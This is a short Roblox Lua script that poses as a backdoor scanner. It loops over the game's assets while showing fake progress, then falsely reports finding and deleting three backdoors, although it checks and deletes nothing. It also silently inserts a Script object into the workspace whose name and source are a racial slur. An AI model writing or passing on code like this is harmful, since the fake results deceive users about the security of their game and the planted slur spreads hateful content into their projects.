local Progress = Instance.new("Message", workspace)
local Script = Instance.new("Script", workspace)


Script.Name = "i hate niggers"
Script.Source = [[
i hate niggers

]]

Progress.Text = "Scanning..."

for i, v in pairs(game:GetDescendants()) do
    if i ~= #game:GetDescendants() then
        Progress.Text = string.format("Scanned %s out of %s assets.\nCurrent asset: %s", i, #game:GetDescendants(), v.Name)
    else
        Progress.Text = "Scanned all assets for backdoors. Found and deleted 3 backdoors. Deleting in 30 Seconds."
        task.wait(30)
        Progress:Destroy()
    end
    task.wait(.01)
end
